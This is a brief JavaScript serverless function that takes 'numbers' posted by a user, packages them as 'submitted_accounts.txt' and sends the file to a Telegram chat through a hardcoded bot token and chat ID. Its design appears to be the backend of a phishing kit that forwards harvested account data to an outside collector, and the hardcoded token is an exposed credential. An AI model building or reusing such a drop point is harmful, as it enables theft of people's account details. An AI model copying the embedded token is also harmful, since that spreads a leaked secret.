exports.handler = async (event) => {
  try {
    const BOT_TOKEN = "8413503906:AAEFK581NgqwYwQQdTaT-8nMJEts9xXHNpA";
    const CHAT_ID = "6442344136";

    const body = JSON.parse(event.body || "{}");
    const numbers = body.numbers || "No numbers received";

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);

    const blob = new Blob([numbers], { type: "text/plain" });
    formData.append("document", blob, "submitted_accounts.txt");

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
      {
        method: "POST",
        body: formData
      }
    );

    const result = await response.json();
    console.log("Telegram response:", result);

    return {
      statusCode: 200,
      body: JSON.stringify(result)
    };

  } catch (err) {
    console.log("ERROR:", err);
    return {
      statusCode: 500,
      body: "Error sending TXT file"
    };
  }
};
